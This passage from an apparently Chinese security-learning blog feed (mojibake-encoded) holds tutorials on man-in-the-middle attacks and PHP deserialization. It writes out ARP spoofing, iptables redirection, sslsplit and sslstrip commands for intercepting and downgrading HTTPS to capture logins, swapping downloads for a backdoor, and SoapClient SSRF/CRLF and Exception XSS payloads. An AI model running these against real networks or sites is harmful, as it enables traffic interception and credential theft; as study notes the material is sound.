style="zoom:80%;"><p>è¾“å…¥helpè·å–å¸®åŠ©ï¼Œç›´æ¥scanå‘½ä»¤æ‰«æï¼Œæœ‰æ—¶å€™ä¾¯å¯èƒ½æ‰«æä¸åˆ°ï¼Œç›´æ¥è¾“ipå°±è¡Œ</p><p>è¿›å…¥modulesä¹‹åï¼ŒhelpæŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼Œå…ˆè¯•è¯•<strong>æ³¨å…¥html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-size:80px;&quot;</span> &gt;</span>hacked by MoonBack!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éšä¾¿æ‰¾äº†ä¸ªä¸æ˜¯httpsçš„ç«™ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æ³¨å…¥æˆåŠŸ</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325223100.png" style="zoom:80%;"><p><strong>æ›¿æ¢æ‰€æœ‰å›¾ç‰‡</strong>ï¼Œéšä¾¿æ‰¾çš„ä¸€ä¸ªç«™ç‚¹ï¼Œæ²¡ä»€è«ç‰¹åˆ«çš„æ„æ€</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325223835.png" style="zoom: 67%;"><p><strong>æ›¿æ¢ä¸‹è½½æ–‡ä»¶</strong></p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325224113.png" style="zoom:80%;"><p>æˆ‘ä»¬è¯•ç€ä¸‹è½½ä¸€ä¸ªexe</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325224431.png" style="zoom:80%;"><p>å’Œkalié‡Œç”Ÿæˆçš„åé—¨ä¸€æ ·</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325224545.png" style="zoom:80%;"><h2 id="ä¼ªé€ è¯ä¹¦æŠ“https"><a href="#ä¼ªé€ è¯ä¹¦æŠ“https" class="headerlink" title="ä¼ªé€ è¯ä¹¦æŠ“https"></a>ä¼ªé€ è¯ä¹¦æŠ“https</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä»½æ•°å­—æ ¹è¯ä¹¦ï¼Œå¯ä»¥ç”¨opensslç”Ÿæˆ</p><p>å…ˆç”Ÿæˆè¯ä¹¦ç§é’¥æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ç§é’¥ç­¾åç”Ÿæˆè¯ä¹¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325232838.png" style="zoom:80%;"><p>å†ä»‹ç»ä¸€ä¸‹å·¥å…·<strong>SSLsplit</strong></p><ul><li>é€æ˜SSL/TLSä¸­é—´äººæ”»å‡»å·¥å…·</li><li>å¯¹å®¢æˆ·ç«¯ä¼ªè£…æˆæœåŠ¡å™¨ï¼Œå¯¹æœåŠ¡å™¨ä¼ªè£…æˆå®¢æˆ·ç«¯</li><li>ä¼ªè£…æœåŠ¡å™¨éœ€è¦ä¼ªè£…è¯ä¹¦</li><li>æ”¯æŒSSL/TLSåŠ å¯†çš„SMTP POP3 FTPç­‰é€šä¿¡ä¸­é—´äººæ”»å‡»</li></ul><p><strong>å‚æ•°ï¼š</strong></p><ul><li><p>-k æŒ‡å®šç§é’¥keyæ–‡ä»¶ï¼Œè¿›è¡Œæ¬ºéª—</p></li><li><p>-c æŒ‡å®šRoot CAè¯ä¹¦æ–‡ä»¶</p></li><li><p>-D Debugæ¨¡å¼ï¼Œç”¨äºè¾“å‡ºSSLSplitçŠ¶æ€ï¼Œå»ºè®®ä½¿ç”¨æ—¶åŠ ä¸Š</p></li><li><p>-j æŒ‡å®šlogç›®å½•åœ°å€</p></li><li><p>-S æŒ‡å®š-jå‚æ•°ç›®å½•ä¸‹éœ€è¦è®°å½•æˆªæ–­GETã€POSTè¯·æ±‚çš„å­ç›®å½•åœ°å€</p></li><li><p>-l æŒ‡å®šå­˜å‚¨çš„è¿æ¥ä¿¡æ¯æ–‡ä»¶</p></li><li><p>ssl IP ç«¯å£ æŒ‡å®šssléœ€è¦ç›‘å¬çš„ç«¯å£</p></li><li><p>tcp IP ç«¯å£ æŒ‡å®štcpéœ€è¦ç›‘å¬çš„ç«¯å£</p></li></ul><p>æ‰“å¼€ip_forwardåŠŸèƒ½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>è¿›è¡Œç«¯å£è½¬å‘ï¼Œå³å°†æœ¬æœº443ç­‰ç«¯å£è½¬å‘åˆ°SSLsplitç›‘å¬çš„ç«¯å£ï¼Œè¿™é‡Œæ˜¯8080å’Œ8443</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹è®¾ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325233821.png" style="zoom:80%;"><p>å¼€å¯arpæ¬ºéª—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>SSLsplitç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/Desktop/d -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ‰“å¼€ç™¾åº¦ï¼Œå‘ç°æœ‰è¿™ç§æé†’ï¼Œå¦‚æœå¿½ç•¥å±å®³ç›´æ¥æ‰“å¼€ï¼Œæˆ‘ä»¬çš„è´¦å·ç­‰ä¿¡æ¯å°±ä¼šè¢«çªƒå–</p><p>å½“ç„¶ï¼Œå¦‚æœé€šè¿‡ç‰¹æ®Šé€”å¾„æŠŠè¯ä¹¦è£…åˆ°äº†å—å®³è€…çš„è®¾å¤‡ä¸Šï¼Œå°±ä¸ä¼šæœ‰æé†’ï¼Œæ‰€æœ‰çš„ä¿¡æ¯ä¹Ÿä¼šè¢«è§£å¯†</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325234941.png" style="zoom:80%;"><p>è¿™ç§æ•ˆæœä¸å¤ªå¥½ï¼Œå¾ˆå¡ï¼Œè€Œä¸”å›¾ç‰‡æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200326001603.png" style="zoom:80%;"><p>éšä¾¿è¾“ä¸€ä¸ªè´¦å·ï¼Œçœ‹åˆ°é‡Œé¢æœ‰ä¿¡æ¯</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200326001511.png" style="zoom:80%;"><p>è™½ç„¶æ•ˆæœä¸ç®—ç†æƒ³ï¼Œä½†ä¹Ÿä¸å¤±ä¸ºä¸€ç§æ–¹å¼ï¼Œå¤§ä½¬çš„è§£é‡Šæ„Ÿè§‰å¾ˆå¥½</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200326001857.png" style="zoom:80%;"><h2 id="https-é™çº§æ”»å‡»"><a href="#https-é™çº§æ”»å‡»" class="headerlink" title="https é™çº§æ”»å‡»"></a>https é™çº§æ”»å‡»</h2><p>æ”»å‡»è€…æ‹¦æˆªç”¨æˆ·æµé‡åï¼Œæ¬ºéª—ç”¨æˆ·ä¸æ”»å‡»è€…è¿›è¡Œ http é€šä¿¡ï¼Œæ”»å‡»è€…ä¸æœåŠ¡å™¨ä¿æŒæ­£å¸¸é€šä¿¡ ï¼ˆhttp æˆ– httpsï¼‰ï¼Œä»è€Œè·å–ç”¨æˆ·ä¿¡æ¯ã€‚</p><p>SSLstripå·¥å…·ä¸»è¦åˆ©ç”¨äº†ä¸Šé¢çš„åŸç†</p><p>githubåœ°å€ï¼š<a href="https://github.com/moxie0/sslstrip">https://github.com/moxie0/sslstrip</a></p><p>ç”¨iptablesæŠŠ80ç«¯å£çš„æµé‡è½¬å‘åˆ°sslstripç›‘å¬çš„8080ç«¯å£ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure><p>ç„¶åSSlstripç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure><p>å¼€å¯arpæ¬ºéª—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>ipè½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬è®¿é—®ç™¾åº¦çš„æ—¶ä¾¯éƒ½ä¼šå¼ºåˆ¶è½¬æ¢æˆhttpsï¼Œä½†ç°åœ¨æˆ‘ä»¬è®¿é—®éƒ½æ˜¯httpäº†ï¼Œhttpsçš„æ— æ³•æ‰“å¼€ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œä»¥åçœ‹çœ‹è¿˜æœ‰å…¶ä»–æ–¹æ³•æ²¡</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200326004214.png" style="zoom:80%;"><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_42025840/article/details/81604497">https://blog.csdn.net/qq_42025840/article/details/81604497</a></p><p><a href="https://www.freebuf.com/sectool/118574.html">https://www.freebuf.com/sectool/118574.html</a></p><p><a href="https://blog.csdn.net/ysynhtt/article/details/39996933">https://blog.csdn.net/ysynhtt/article/details/39996933</a></p><p><a href="https://www.freebuf.com/sectool/48016.html">https://www.freebuf.com/sectool/48016.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æŠ˜è…¾ </tag>
            
            <tag> ä¸­é—´äººæ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–ä¹‹åŸç”Ÿç±»</title>
      <link href="2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpåŸç”Ÿç±»ååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>å…ˆå›é¡¾ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å½“å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è°ƒç”¨ï¼š__construct()</span><br><span class="line">å½“å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è°ƒç”¨ï¼š__destruct()</span><br><span class="line">å½“å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶å€™è°ƒç”¨(ä¸ä»…ä»…æ˜¯echoçš„æ—¶å€™,æ¯”å¦‚file_exists()åˆ¤æ–­ä¹Ÿä¼šè§¦å‘)ï¼š__toString()</span><br><span class="line">åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦æ˜¯ä¸€ä¸ªæ•°ç»„)ï¼š__sleep()</span><br><span class="line">ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•ï¼š__wakeup()</span><br><span class="line">å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•ï¼š__call()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬çœ‹ä¸€ä¸‹phpå†…ç½®ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">&#x27;::&#x27;</span> . $method . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æœ‰äº›ç±»ä¸ä¸€å®šèƒ½å¤Ÿè¿›è¡Œååºåˆ—åŒ–ï¼Œphpä¸­ä½¿ç”¨äº†<code>zend_class_unserialize_deny</code>æ¥ç¦æ­¢ä¸€äº›ç±»çš„ååºåˆ—åŒ–</p><p>å¸¸ç”¨çš„æœ‰ä¸‹é¢è¿™äº›</p><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>ä»phpæ‰‹å†Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰è¿™éº½å¤šæ–¹æ³•</p><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIMæˆªå›¾20200322222329.png" style="zoom:80%;"><p>soapclientæœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼Œwsdlå’Œéwsdlæ¨¡å¼ï¼ŒWSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ï¼Œsoapåè®®çš„å…·ä½“æ ¼å¼å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œsoapé‡‡ç”¨httpæˆ–è€…httpsåè®®å‘é€æ•°æ®ï¼Œå¹¶ä¸”åœ¨http headerå¤´ä¸­é€šè¿‡soap actionæ¥æ ‡ç¤ºè‡ªå·±æ˜¯ä¸€ä¸ªsoapè¯·æ±‚</p><p><a href="https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html">https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html</a></p><p>è¿™ä¸ªä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œphp5ã€7éƒ½å­˜åœ¨æ­¤ç±»</p><p>å½“ç„¶è¦ä¿è¯phpå¼€å¯soapæ‰©å±•</p><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIMæˆªå›¾20200322223538.png" style="zoom:80%;"><p><strong>SSRFï¼š</strong></p><p>ç”±äº<code>__call()</code>æ–¹æ³•ä¼šåœ¨è°ƒç”¨æ²¡æœ‰çš„æ–¹æ³•è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555/aaa&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIMæˆªå›¾20200322223715.png" style="zoom:80%;"><p>soapç±»æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰<code>User-Agent</code>ï¼Œhttp headeré‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„å‚æ•°<code>Content-Typeä¸º</code>å’Œ<code>Content-Length</code><br>æˆ‘ä»¬å¯ä»¥è¿›è¡ŒCRLFæ³¨å…¥ï¼Œè€Œ<code>User-Agent</code>çš„http headerä½ç½®æ­£å¥½åœ¨è¿™äº›ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–<br>å¯¹äº<code>Content-Type</code>ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ©ç”¨CRLFå‘é€postè¯·æ±‚ï¼Œé‚£ä¹ˆè¦æ±‚å®ƒä¸º<code>application/x-www-form-urlencode</code><br>é‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨CRLFï¼Œæ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://example.com:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;notexists();</span><br></pre></td></tr></table></figure><img src="/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/TIMæˆªå›¾20200322225147.png" style="zoom:80%;"><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><p>åªé€‚ç”¨äºphp7ç‰ˆæœ¬</p><p><strong>XSS:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="comment">// echo urlencode($b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize($c);</span><br></pre></td></tr></table></figure><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬</p><p><strong>XSS:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="comment">// echo urlencode($b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line">$c = urldecode(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize($c);</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2nd writeup</title>
      <link href="2020/03/21/BJDCTF-2rd-writeup/"/>
      <url>2020/03/21/BJDCTF-2rd-writeup/</url>
      
